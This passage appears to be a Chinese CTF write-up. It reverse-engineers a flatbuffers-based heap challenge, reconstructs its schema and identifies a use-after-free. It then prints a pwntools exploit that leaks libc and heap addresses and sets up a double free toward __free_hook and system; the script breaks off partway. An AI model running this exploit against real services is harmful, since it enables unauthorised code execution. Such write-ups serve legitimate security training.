<li>64位，dynamically，Partial RELRO，NX，PIE</li>
</ul>
<p><strong>flatbuffers 逆向分析</strong></p>
<p>在开始分析本题目前，需要先了解 flatbuffers 的相关知识，可以在官网了解其基础用法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://flatbuffers.dev/flatbuffers_guide_tutorial.html">FlatBuffers: Tutorial</a> </li>
</ul>
<p>经过长时间的逆向分析，发现程序会大量使用如下结构去索引数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1BE0</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_2E70((__int64)a1, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_2E70</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int16 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_2EA0(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_2EA0</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int16 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_2A30(a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> sub_23C0((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(v4 + a1)) + v4 + a1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_2A30</span><span class="params">(__int64 input, <span class="keyword">unsigned</span> __int16 num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = (<span class="keyword">char</span> *)sub_2AE0(input);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt;= (<span class="keyword">int</span>)sub_29D0((<span class="keyword">unsigned</span> __int16 *)v4) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sub_29D0((<span class="keyword">unsigned</span> __int16 *)&amp;v4[num]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从 flatbuffers 官方测试样例中编译了几个二进制文件，找到类似的结构：（反序列化部分）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MyGame::Sample::Vec3 *__cdecl MyGame::Sample::Monster::<span class="built_in">pos</span>(<span class="keyword">const</span> MyGame::Sample::Monster *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetStruct&lt;MyGame::Sample::Vec3 <span class="keyword">const</span>*&gt;(<span class="keyword">this</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MyGame::Sample::Vec3 *__cdecl flatbuffers::Table::GetStruct&lt;MyGame::Sample::Vec3 <span class="keyword">const</span>*&gt;(</span><br><span class="line">        <span class="keyword">const</span> flatbuffers::Table *<span class="keyword">const</span> <span class="keyword">this</span>,</span><br><span class="line">        flatbuffers::<span class="keyword">voffset_t</span> field)</span><br><span class="line">&#123;</span><br><span class="line">  flatbuffers::<span class="keyword">voffset_t</span> OptionalFieldOffset; <span class="comment">// ax</span></span><br><span class="line"></span><br><span class="line">  OptionalFieldOffset = flatbuffers::Table::<span class="built_in">GetOptionalFieldOffset</span>(<span class="keyword">this</span>, field);</span><br><span class="line">  <span class="keyword">if</span> ( OptionalFieldOffset )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">const</span> MyGame::Sample::Vec3 *)&amp;<span class="keyword">this</span>[OptionalFieldOffset];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flatbuffers::<span class="keyword">voffset_t</span> __cdecl flatbuffers::Table::<span class="built_in">GetOptionalFieldOffset</span>(</span><br><span class="line">        <span class="keyword">const</span> flatbuffers::Table *<span class="keyword">const</span> <span class="keyword">this</span>,</span><br><span class="line">        flatbuffers::<span class="keyword">voffset_t</span> field)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> __int8 *vtable; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  vtable = flatbuffers::Table::<span class="built_in">GetVTable</span>(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">if</span> ( field &gt;= flatbuffers::ReadScalar&lt;<span class="keyword">unsigned</span> <span class="keyword">short</span>&gt;(vtable) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> flatbuffers::ReadScalar&lt;<span class="keyword">unsigned</span> <span class="keyword">short</span>&gt;(&amp;vtable[field]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，题目设计了 flatbuffers 反序列化的部分，需要我们逆向出序列化逻辑并将序列化后数据作为程序的输入</p>
<p>flatbuffers 的反序列化需要定义 <code>cft.fbs</code> 文件（用于指定序列化格式），目前只能通过反序列化伪代码来猜测 <code>cft.fbs</code> 中可能的结构，我在题目中找到了如下的突破口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Verify</span><span class="params">(<span class="keyword">char</span> *<span class="keyword">this</span>, _QWORD *verifier)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 key; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *index2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (VerifyTableStart((__int64)<span class="keyword">this</span>, verifier) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( VerifyOffset_unsigned_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">4u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      key = get_key(<span class="keyword">this</span>);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (VerifyString(verifier, key) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (VerifyField_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">6u</span>, <span class="number">8LL</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (VerifyField_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">8u</span>, <span class="number">8LL</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v6 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( VerifyOffset_unsigned_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">0xA</span>u) )</span><br><span class="line">            &#123;</span><br><span class="line">              index2 = get_index2((__int64)<span class="keyword">this</span>);</span><br><span class="line">              v6 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( (sub_2630((__int64)verifier, (__int64)index2) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v4 = get_index2((__int64)<span class="keyword">this</span>);</span><br><span class="line">                v6 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (sub_2680((__int64)verifier, v4) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                  v6 = sub_2720((__int64)verifier);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Verifier 是 flatbuffers 的检查器：</p>
<ul>
<li><code>VerifyString(verifier, key)</code> 暴露了 <code>cft.fbs</code> 的第1个条目是 string</li>
<li><code>VerifyField_int(this, verifier, 6u, 8LL)</code> 暴露了 <code>cft.fbs</code> 的第2,3个条目是 int64</li>
</ul>
<p>而最后一个条目可以从如下伪代码中分析出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1 = get_index2((__int64)input);</span><br><span class="line">v6 = get_index(v1, offset);</span><br><span class="line">index = sub_1D10(v6);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_index</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_1C80(a1) )</span><br><span class="line">    __assert_fail(</span><br><span class="line">      <span class="string">&quot;i &lt; size()&quot;</span>,</span><br><span class="line">      <span class="string">&quot;../include/flatbuffers/vector.h&quot;</span>,</span><br><span class="line">      <span class="number">0xB0</span>u,</span><br><span class="line">      <span class="string">&quot;flatbuffers::Vector::return_type flatbuffers::Vector&lt;flatbuffers::Offset&lt;MyGame::Item&gt;&gt;::Get(SizeT) const [T = fla&quot;</span></span><br><span class="line">      <span class="string">&quot;tbuffers::Offset&lt;MyGame::Item&gt;, SizeT = unsigned int]&quot;</span>);</span><br><span class="line">  v2 = sub_3BB0(a1);</span><br><span class="line">  <span class="keyword">return</span> sub_3B60(v2, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cft.fbs</code> 的第4个条目是 Vector tables2</li>
<li>近一步对比分析可以得知：tables2 存放有2个条目 - (int64,string)</li>
</ul>
<p>最后设计出的 <code>cft.fbs</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> Test.Sample;</span><br><span class="line"> </span><br><span class="line">table Monster &#123;</span><br><span class="line">  key:<span class="built_in">string</span>;</span><br><span class="line">  offset:int64 = <span class="number">0</span>;</span><br><span class="line">  size:int64 = <span class="number">0</span>;</span><br><span class="line">  index:[Weapon];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table Weapon &#123;</span><br><span class="line">  index:int64;</span><br><span class="line">  key:<span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">root_type Monster;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>程序只置空了 size，有 UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(datag.chunk_list[index]);</span><br><span class="line">datag.size_list[index] = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先利用 UAF 进行泄露</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecfd0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x122c0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>然后利用 UAF 打 double free 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-s</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./rpg1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x158D)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>)</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x10</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0xc</span>)</span><br><span class="line">    payload += p64(index)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;aaaa&quot;</span>+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">6</span>)+<span class="string">&quot;Create&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index,size=<span class="number">0</span>,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>)</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x10</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0xc</span>)</span><br><span class="line">    payload += p64(index)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;aaaa&quot;</span>+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;Show&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index,size=<span class="number">0</span>,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>)</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x10</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0xc</span>)</span><br><span class="line">    payload += p64(index)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;aaaa&quot;</span>+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">6</span>)+<span class="string">&quot;Delete&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,data,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>+<span class="built_in">len</span>(data))</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x14</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0x10</span>)</span><br><span class="line">    payload += p64(index)+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="built_in">len</span>(data))+data+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;Edit&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecfd0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x122c0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i+<span class="number">2</span>)</span><br><span 